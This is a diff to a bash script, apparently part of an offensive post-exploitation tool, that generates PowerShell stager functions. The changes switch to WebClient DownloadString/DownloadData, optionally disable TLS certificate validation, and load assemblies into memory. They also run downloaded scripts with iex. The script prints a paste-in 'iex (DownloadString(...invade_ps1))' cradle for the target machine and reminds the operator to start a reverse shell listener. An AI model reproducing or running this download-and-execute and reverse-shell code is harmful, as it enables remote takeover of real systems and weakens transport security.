@@ -55,7 +55,8 @@ deploy_get() {
 
     cat <<EOF
 function Get-$name {
-    [System.Text.Encoding]::ASCII.GetString(($iwr $url/$path).content)
+    ${tls:+$validation}
+    $client.DownloadString("$url/$path")
 }
 function Deploy-$name {
     Param
@@ -79,8 +80,11 @@ deploy_get_bin() {
 
     cat <<EOF
 function Import-$name {
+    ${tls:+$validation}
     Import-Module -Assembly (
-        [System.Reflection.Assembly]::Load(($iwr $url/$path).content)
+        [System.Reflection.Assembly]::Load(
+            ($client.DownloadData("$url/$path"))
+        )
     )
 }
 function Deploy-$name {
@@ -106,11 +110,8 @@ deploy_run() {
     deploy_get "$name" "$path"
     cat <<EOF
 function Invoke-$name {
-    iex (
-        [System.Text.Encoding]::ASCII.GetString(
-            ($iwr $url/$path).content
-        )
-    )
+    ${tls:+$validation}
+    iex ($client.DownloadString("$url/$path"))
 }
 function Invoke-${name}InBg {
     Start-Job -ScriptBlock (
@@ -307,11 +308,16 @@ esac
 
 # Save some variables for convenience
 cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
-iwr="iwr -DisableKeepAlive -UseBasicParsing"
-[[ -z $tls ]] || iwr+=" -SkipCertificateCheck"
+client="(New-Object System.Net.WebClient)"
 languagemode="\$ExecutionContext.SessionState.LanguageMode"
 red="\$([char]27)[41m"
 reset="\$([char]27)[0m"
+if [[ -n $tls ]]; then
+    validation="[System.Net.ServicePointManager]::"
+    validation+="ServerCertificateValidationCallback={\$true}"
+else
+    unset validation
+fi
 
 # Setup trap
 trap cleanup SIGINT
@@ -350,7 +356,8 @@ function prompt {
 EOF
 
 # Let user know what to type
-info "iex ($iwr $url/$invade_ps1)"
+[[ -z $tls ]] || info "$validation"
+info "iex ($client.DownloadString(\"$url/$invade_ps1\"))"
 warn "Don't forget your reverse shell listener on port $rport"
 
 # Open firewall
